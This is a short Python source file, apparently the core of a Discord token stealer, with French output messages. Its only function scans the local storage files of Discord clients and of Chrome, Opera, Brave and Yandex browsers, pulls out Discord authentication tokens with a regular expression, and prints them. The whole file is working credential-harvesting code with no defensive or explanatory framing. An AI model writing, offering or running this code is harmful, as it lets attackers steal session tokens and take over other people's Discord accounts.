import os
import re

def grab_discord_tokens():
    paths = {
        'Discord': os.getenv('APPDATA') + '\\Discord',
        'Discord Canary': os.getenv('APPDATA') + '\\discordcanary',
        'Discord PTB': os.getenv('APPDATA') + '\\discordptb',
        'Google Chrome': os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default',
        'Opera': os.getenv('APPDATA') + '\\Opera Software\\Opera Stable',
        'Brave': os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': os.getenv('LOCALAPPDATA') + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    
    tokens = []
    for platform, path in paths.items():
        try:
            for file_name in os.listdir(path + '\\Local Storage\\leveldb\\'):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                with open(path + f'\\Local Storage\\leveldb\\{file_name}', 'r', encoding='latin-1') as f:
                    data = f.read()
                    matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', data)
                    if matches:
                        tokens.extend(matches)
        except FileNotFoundError:
            continue
    
    if tokens:
        print("Tokens Discord trouvés:")
        for token in tokens:
            print(token)
    else:
        print("Aucun token trouvé.")
